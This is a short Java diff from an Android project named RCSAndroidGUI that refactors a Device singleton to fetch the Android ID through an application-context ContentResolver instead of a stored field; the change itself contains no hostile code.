@@ -21,27 +21,8 @@ import com.ht.RCSAndroidGUI.utils.Utils;
  */
 public class Device {
 
-	/** The content resolver. */
-	private ContentResolver contentResolver;
-
 	/** The android id. */
 	private String androidId;
-
-	/**
-	 * Inits the.
-	 * 
-	 * @param cr
-	 *            the cr
-	 * @throws RCSException
-	 *             the rCS exception
-	 */
-	public void init(final ContentResolver cr) throws RCSException {
-		if (cr == null) {
-			throw new RCSException("ContentResolver Invalid");
-		}
-
-		this.contentResolver = cr;
-	}
 
 	/** The singleton. */
 	private volatile static Device singleton;
@@ -79,7 +60,7 @@ public class Device {
 	 * @return the device id
 	 */
 	public String getDeviceId() {
-		final String id = Settings.System.getString(contentResolver,
+		final String id = Settings.System.getString(Status.getAppContext().getContentResolver(),
 				Settings.System.ANDROID_ID);
 		return id;
 	}
